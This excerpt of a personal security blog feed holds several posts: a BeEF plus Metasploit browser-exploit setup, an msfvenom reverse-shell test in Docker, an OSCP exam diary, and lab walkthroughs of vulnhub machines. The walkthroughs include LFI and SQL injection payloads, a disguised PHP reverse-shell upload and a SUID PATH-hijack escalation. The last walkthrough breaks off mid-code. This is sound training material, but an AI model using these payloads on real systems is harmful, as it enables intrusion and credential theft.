    <id>http://wg135.github.io/blog/2017/06/26/beef-and-metasploit</id>
    <content type="html"><![CDATA[<p>Today I will take a note about how to use beef with metasploit</p>

<h3>install beef</h3>

<p>Although kali includes beef, it still have some issues when I use.</p>

<p>to include latest beef:</p>

<p><code>git clone https://github.com/beefproject/beef.git</code></p>

<p><code>cd beef</code>
<code>bundle install</code></p>

<!--more-->


<p>in beef/, change configure file config.yaml</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>change host and callback host value as well ssl as true in beef/extensions/metasploit/config.yaml</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>now start metasploit:</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>start beef:</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>in <a href="http://127.0.0.1:3000/ui/authentication">http://127.0.0.1:3000/ui/authentication</a></p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>login beef</p>

<p>now create index.html:</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>after that, in metasploit, I use MS12-063</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>use IE7 to access malicious index.html. get IE info from beef.</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>Search command redirect and feed its url which is generated in msf</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>get meterpreter:</p>

<p><img src="http://wg135.github.io/images/blog/misc/beef/Selection_010.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[Install kali and metasploit in VPS using docker]]></title>
    <link href="http://wg135.github.io/blog/2017/06/13/install-kali-and-metasploit-in-vps-using-docker/"/>
    <updated>2017-06-13T15:06:01-05:00</updated>
    <id>http://wg135.github.io/blog/2017/06/13/install-kali-and-metasploit-in-vps-using-docker</id>
    <content type="html"><![CDATA[<p>use docker to install kali and metasploit</p>

<!--more-->


<h3>install docker:</h3>

<p><code>sudo apt-get install docker.io</code></p>

<h3>download kali image:</h3>

<p><code>docker pull kalilinux/kali-linux-docker</code></p>

<p>This kali doesn&rsquo;t include msf. So we need to put kali in container and then install msf</p>

<p>create kali container:</p>

<p><code>docker run -t -i kalilinux/kali-linux-docker /bin/bash</code></p>

<h3>install metasploit</h3>

<p><code>apt-get update &amp;&amp; apt-get upgrade</code>
<code>apt-get install metasploit-framework</code></p>

<p>after that, run metasploit</p>

<p><img src="http://wg135.github.io/images/blog/docker/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>looks good. quit msf, quit kali container.</p>

<p>check container ID</p>

<p><code>sudo docker ps -a</code></p>

<p><img src="http://wg135.github.io/images/blog/docker/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>save container to an image:</p>

<p><code>sudo docker commit 6d6853205f78 msf</code></p>

<p>now map vps tcp port 8888 to container&rsquo;s tcp port 8888 for reverse tcp shell</p>

<p><code>docker run -t -p 8888:8888 -i msf /bin/bash</code></p>

<h3>test reverse shell:</h3>

<p>create shell:</p>

<p><code>msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=[vps IP address]LPORT=8888 -f elf &gt; shell.elf</code></p>

<p>download shell.elf then chmod +x shell.elf</p>

<p>setup msf, run shell.elf</p>

<p><img src="http://wg135.github.io/images/blog/docker/Selection_003.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[donkeydocker]]></title>
    <link href="http://wg135.github.io/blog/2017/06/05/donkeydocker/"/>
    <updated>2017-06-05T12:59:36-05:00</updated>
    <id>http://wg135.github.io/blog/2017/06/05/donkeydocker</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>DirBuster</li>
<li>Burp</li>
</ul>


<!--more-->

]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[about OSCP]]></title>
    <link href="http://wg135.github.io/blog/2017/01/25/thoughts-about-oscp/"/>
    <updated>2017-01-25T13:37:10-06:00</updated>
    <id>http://wg135.github.io/blog/2017/01/25/thoughts-about-oscp</id>
    <content type="html"><![CDATA[<p>Haven&rsquo;t update my notes for about 90-120 days. I spent last 3 month in OSCP lab and finally got my first milestone on my way to slag dragon.</p>

<!--more-->


<h2>EXAM:</h2>

<h3>Exam round 1:</h3>

<p>Battle plan: start at 4:00PM. Knock out 4 machines</p>

<p>The exam connection package came at 4:00PM. I started my first machine and got root at 6:00PM. Then I started on an easy box and got the root at 7:00 PM. I felt I was on roll and I thought man that’s easy. Then I had a quick dinner and jumped to third machine without rest (this was a mistake).</p>

<p>Bad thing happened, until 2:00AM, I focused on 2 machines. I made no progress. I decided to go to bed and felt so frustrated and pain. At that time, I changed my battle plan that only focus on the last machine, since if I could root that box, I may have 60 points in the exam and another 10 points in the lab, so I may still have chance to pass.</p>

<p>Next day 7:00AM. I started work on last box. 10:00AM, got shell, I felt I see the light in the tunnel. Started to do privilege escalation. Until 3:00PM no progress. Finally, I found the vulnerability at last moment but VPN time out.</p>

<p>After one day got the result:</p>

<h2>failed</h2>

<p>After the exam, I didn’t extend lab. I created many VMs for practice. Many windows and Linux local privilege exploits code are compiled. I went back to vulnhub and downloaded many VMs to practice and wait for round two.</p>

<h3>Exam round 2:</h3>

<p>Battle plan: start at 8:00AM. Knock out 4 machines</p>

<p>Got first root at 9:00AM. At 9:30AM got another one. So in first 90 mins, I got 2 machines. But I was not excited. I knew hard part was not coming yet. Until 5:00PM, I got a limited shell in a box. I started to do privilege exploit on it but until 9:00PM, I made no progress. Started to feel frustrated. I took one hour break then decided to try another machine. 11:00 PM got limited shell. 1:00 AM got root. I was really tired at that time; I took another 1-hour break. 2:00AM I started my last ditch. I tried to get the root in the machine I got shell and tried to get limited shell on the last box. I found a vulnerability on the last box, but I didn’t successfully trigger it. VPN time out again.</p>

<p>The time I got 3 roots and 1 shell. I guess I got 65 points in the exam and there are 10 lab report points may be added.</p>

<p>After one day got the result:</p>

<h2>pass!</h2>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[pwnlab_init]]></title>
    <link href="http://wg135.github.io/blog/2016/09/11/pwnlab-init/"/>
    <updated>2016-09-11T09:07:37-05:00</updated>
    <id>http://wg135.github.io/blog/2016/09/11/pwnlab-init</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>DirBuster</li>
<li>Burp</li>
</ul>


<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.50.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.50.131 is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.50.131 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 80 is opening.</p>

<p>use nikto to scan</p>

<p><code>nikto -h 192.168.50.131</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>use dirbuster to get all dirs and files</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>check the page:</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use sqlmap</p>

<p><code>sqlmap -u "http://192.168.50.131"  --forms --batch --crawl=10 --level=5 --risk=3 --random-agent --dbms=MySQL</code></p>

<p>Nothing.</p>

<p>Check the page souce code,</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>It seems there is a local file inclusion in <code>page</code> parmeter, based on <a href="https://diablohorn.com/2010/01/16/interesting-local-file-inclusion-method/">LFI</a></p>

<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=config</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>get config.php' base64 encoded content</p>

<p><code>echo PD9waHANCiRzZXJ2ZXIJICA9ICJsb2NhbGhvc3QiOw0KJHVzZXJuYW1lID0gInJvb3QiOw0KJHBhc3N3b3JkID0gIkl9IOTkiOw0KJGRhdGFiYXNlID0gIlVzZXJzIjsNCj8+ | base64 --decode</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>get mysql username/password</p>

<p>connect mysql database:</p>

<p><code>mysql -h 192.168.50.131 -u root -pH4u%QJ_H99</code></p>

<p>show databases:</p>

<p><code>mysql&gt; show databases;</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>mysql&gt; show tables;
</span><span class='line'>mysql&gt; use Users;
</span><span class='line'>mysql&gt; select * from users;</span></code></pre></td></tr></table></div></figure>


<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>these passwords are base64 encoded</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kent | JWzXuBJJNy
</span><span class='line'>mike | SIfdsTEn6I
</span><span class='line'>kane | iSv5Ym2GRo</span></code></pre></td></tr></table></div></figure>


<p>login as kane</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>try to upload webshell, failed. only accept image.</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>in order to find out which file extension do i need</p>

<p>I will get upload.php code</p>

<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=upload</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_013.png" title="[title manually exploit [alt text]]" ></p>

<p>decode the content</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="nb">session_start</span><span class="p">();</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_SESSION</span><span class="p">[</span><span class="s1">&#39;user&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="k">die</span><span class="p">(</span><span class="s1">&#39;You must be log in.&#39;</span><span class="p">);</span> <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">  &lt;body&gt;</span>
</span><span class='line'><span class="x">      &lt;form action=&#39;&#39; method=&#39;post&#39; enctype=&#39;multipart/form-data&#39;&gt;</span>
</span><span class='line'><span class="x">          &lt;input type=&#39;file&#39; name=&#39;file&#39; id=&#39;file&#39; /&gt;</span>
</span><span class='line'><span class="x">          &lt;input type=&#39;submit&#39; name=&#39;submit&#39; value=&#39;Upload&#39;/&gt;</span>
</span><span class='line'><span class="x">      &lt;/form&gt;</span>
</span><span class='line'><span class="x">  &lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'><span class="k">if</span><span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">&lt;=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>      <span class="nv">$filename</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span><span class='line'>      <span class="nv">$filetype</span>  <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;type&#39;</span><span class="p">];</span>
</span><span class='line'>      <span class="nv">$uploaddir</span> <span class="o">=</span> <span class="s1">&#39;upload/&#39;</span><span class="p">;</span>
</span><span class='line'>      <span class="nv">$file_ext</span>  <span class="o">=</span> <span class="nb">strrchr</span><span class="p">(</span><span class="nv">$filename</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="nv">$imageinfo</span> <span class="o">=</span> <span class="nb">getimagesize</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">]);</span>
</span><span class='line'>      <span class="nv">$whitelist</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&quot;.jpg&quot;</span><span class="p">,</span><span class="s2">&quot;.jpeg&quot;</span><span class="p">,</span><span class="s2">&quot;.gif&quot;</span><span class="p">,</span><span class="s2">&quot;.png&quot;</span><span class="p">);</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="p">(</span><span class="nb">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$whitelist</span><span class="p">)))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Not allowed extension, please upload images only.&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">strpos</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span><span class="s1">&#39;image&#39;</span><span class="p">)</span> <span class="o">===</span> <span class="k">false</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 001&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/gif&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpeg&#39;</span> <span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/jpg&#39;</span><span class="o">&amp;&amp;</span> <span class="nv">$imageinfo</span><span class="p">[</span><span class="s1">&#39;mime&#39;</span><span class="p">]</span> <span class="o">!=</span> <span class="s1">&#39;image/png&#39;</span><span class="p">)</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 002&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span><span class="p">(</span><span class="nb">substr_count</span><span class="p">(</span><span class="nv">$filetype</span><span class="p">,</span> <span class="s1">&#39;/&#39;</span><span class="p">)</span><span class="o">&gt;</span><span class="mi">1</span><span class="p">){</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 003&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>
</span><span class='line'>      <span class="nv">$uploadfile</span> <span class="o">=</span> <span class="nv">$uploaddir</span> <span class="o">.</span> <span class="nb">md5</span><span class="p">(</span><span class="nb">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span><span class='line'>
</span><span class='line'>      <span class="k">if</span> <span class="p">(</span><span class="nb">move_uploaded_file</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">],</span> <span class="nv">$uploadfile</span><span class="p">))</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">echo</span> <span class="s2">&quot;&lt;img src=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$uploadfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;br /&gt;&quot;</span><span class="p">;</span>
</span><span class='line'>      <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span><span class='line'>          <span class="k">die</span><span class="p">(</span><span class="s1">&#39;Error 4&#39;</span><span class="p">);</span>
</span><span class='line'>      <span class="p">}</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="p">}</span>
</span></code></pre></td></tr></table></div></figure>


<p>so image extensions are <code>$whitelist = array(".jpg",".jpeg",".gif",".png");</code></p>

<p>copy a php reverse shell into a gif file, use burp add <code>GIF</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_014.png" title="[title manually exploit [alt text]]" ></p>

<p>then the php shell is uploaded</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_015.png" title="[title manually exploit [alt text]]" ></p>

<p>now need to find out how to trigger the shell</p>

<p>check index.php</p>

<p><code>curl http://192.168.50.131/?page=php://filter/convert.base64-encode/resource=index</code></p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="o">&lt;?</span><span class="nx">php</span>
</span><span class='line'><span class="c1">//Multilingual. Not implemented yet.</span>
</span><span class='line'><span class="c1">//setcookie(&quot;lang&quot;,&quot;en.lang.php&quot;);</span>
</span><span class='line'><span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]))</span>
</span><span class='line'><span class="p">{</span>
</span><span class='line'>  <span class="k">include</span><span class="p">(</span><span class="s2">&quot;lang/&quot;</span><span class="o">.</span><span class="nv">$_COOKIE</span><span class="p">[</span><span class="s1">&#39;lang&#39;</span><span class="p">]);</span>
</span><span class='line'><span class="p">}</span>
</span><span class='line'><span class="c1">// Not implemented yet.</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;html&gt;</span>
</span><span class='line'><span class="x">&lt;head&gt;</span>
</span><span class='line'><span class="x">&lt;title&gt;PwnLab Intranet Image Hosting&lt;/title&gt;</span>
</span><span class='line'><span class="x">&lt;/head&gt;</span>
</span><span class='line'><span class="x">&lt;body&gt;</span>
</span><span class='line'><span class="x">&lt;center&gt;</span>
</span><span class='line'><span class="x">&lt;img src=&quot;images/pwnlab.png&quot;&gt;&lt;br /&gt;</span>
</span><span class='line'><span class="x">[ &lt;a href=&quot;/&quot;&gt;Home&lt;/a&gt; ] [ &lt;a href=&quot;?page=login&quot;&gt;Login&lt;/a&gt; ] [ &lt;a href=&quot;?page=upload&quot;&gt;Upload&lt;/a&gt; ]</span>
</span><span class='line'><span class="x">&lt;hr/&gt;&lt;br/&gt;</span>
</span><span class='line'><span class="cp">&lt;?php</span>
</span><span class='line'>  <span class="k">if</span> <span class="p">(</span><span class="nb">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]))</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">include</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;page&#39;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;.php&quot;</span><span class="p">);</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'>  <span class="k">else</span>
</span><span class='line'>  <span class="p">{</span>
</span><span class='line'>      <span class="k">echo</span> <span class="s2">&quot;Use this server to upload and share image files inside the intranet&quot;</span><span class="p">;</span>
</span><span class='line'>  <span class="p">}</span>
</span><span class='line'><span class="cp">?&gt;</span><span class="x"></span>
</span><span class='line'><span class="x">&lt;/center&gt;</span>
</span><span class='line'><span class="x">&lt;/body&gt;</span>
</span><span class='line'><span class="x">&lt;/html&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>find out cookie also have LFI.</p>

<p>first verify the LFI</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_016.png" title="[title manually exploit [alt text]]" ></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_017.png" title="[title manually exploit [alt text]]" ></p>

<p>now setup netcat on port 443</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_018.png" title="[title manually exploit [alt text]]" ></p>

<p>get the shell</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_019.png" title="[title manually exploit [alt text]]" ></p>

<p>login in as kane</p>

<p><code>su kane</code></p>

<p>find an interesting file msgmike</p>

<p><code>ls -alh msgmike</code></p>

<p>its seuid is set.</p>

<p>try to run it</p>

<p><code>./msgmike</code></p>

<p>shows <code>cat: /home/mike/msg.txt: No such file or directory</code></p>

<p>try to escape it</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class='php'><span class='line'><span class="nx">export</span> <span class="nx">PATH</span><span class="o">=.:</span><span class="nv">$PATH</span>
</span><span class='line'><span class="k">echo</span> <span class="s2">&quot;/bin/bash&quot;</span> <span class="o">&gt;</span> <span class="nx">cat</span>
</span><span class='line'><span class="nb">chmod</span> <span class="o">+</span><span class="nx">x</span> <span class="nx">cat</span>
</span><span class='line'><span class="o">./</span><span class="nx">msgmike</span>
</span></code></pre></td></tr></table></div></figure>


<p>now escape to user mike.</p>

<p>Find another program&rsquo;s setuid is on</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_020.png" title="[title manually exploit [alt text]]" ></p>

<p>run <code>msg2root</code></p>

<p><code>Message for root:</code></p>

<p>upload <a href="https://github.com/wg135/script/blob/master/suid.c">setuid.c</a>, compiled.</p>

<p>run msg2root, get root</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/pwnlab_init/Selection_021.png" title="[title manually exploit [alt text]]" ></p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[acid_reload]]></title>
    <link href="http://wg135.github.io/blog/2016/09/11/acid-reload/"/>
    <updated>2016-09-11T08:58:02-05:00</updated>
    <id>http://wg135.github.io/blog/2016/09/11/acid-reload</id>
    <content type="html"><![CDATA[<h2>Tools:</h2>

<ul>
<li>netdiscover</li>
<li>Nmap</li>
<li>Wfuzz</li>
<li>DirBuster</li>
<li>Burp</li>
</ul>


<h3>Vulnerabilities:</h3>

<!--more-->


<p>Use netdiscover to detect target IP address</p>

<p><code>netdiscover -i eth0 -r 192.168.41.0/24</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_001.png" title="[title manually exploit [alt text]]" ></p>

<p>192.168.41.170is the target.</p>

<p>Then run nmap to detect opening ports and running services on the target machine.</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.171 -p-</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_002.png" title="[title manually exploit [alt text]]" ></p>

<p>port 22 and 33447 are opening.</p>

<p>Port 33447 is filter, I run nmap again</p>

<p><code>nmap -sV -v -O -A -T5 192.168.41.171 -p 33447</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_003.png" title="[title manually exploit [alt text]]" ></p>

<p>now I know it is running http service.</p>

<p>use nikto to scan:</p>

<p><code>nikto -h 192.168.41.171:33447</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_004.png" title="[title manually exploit [alt text]]" ></p>

<p>find a hidden path &lsquo;/bin&rsquo;</p>

<p>check the page <code>192.168.41.171:33447/bin</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_005.png" title="[title manually exploit [alt text]]" ></p>

<p>use DirBuster to scan</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_006.png" title="[title manually exploit [alt text]]" ></p>

<p>use Burpsuit to check when I try to get <code>/bin/dashboard.php</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_007.png" title="[title manually exploit [alt text]]" ></p>

<p>it is redirected to <code>/bin/includes/validation.php</code>. I can use referer bypass</p>

<p>change http request to <code>GET /bin/dashboard.php HTTP/1.1</code> and referer to <code>Referer: http://192.168.41.171:33447/bin/includes/validation.php</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_008.png" title="[title manually exploit [alt text]]" ></p>

<p>forward the traffic</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_009.png" title="[title manually exploit [alt text]]" ></p>

<p>Bypass successfully.</p>

<p>check the source code</p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_010.png" title="[title manually exploit [alt text]]" ></p>

<p>got an link <code>l33t_haxor.php</code></p>

<p>check the page code
<img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_011.png" title="[title manually exploit [alt text]]" ></p>

<p>find <code>l33t_haxor.php?id=</code> looks like sqli</p>

<p>Let&rsquo;s verify</p>

<p>insert</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1'</code></p>

<p><img src="http://wg135.github.io/images/blog/vulhub/acid_reload/Selection_012.png" title="[title manually exploit [alt text]]" ></p>

<p>easy sqli</p>

<p><code>http://192.168.41.171:33447/bin/l33t_haxor.php?id=1' and true--+</code> no output, so, it is bracket enclosed single quote.</p>

<p>now lets check how many columns we need by inserting null</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
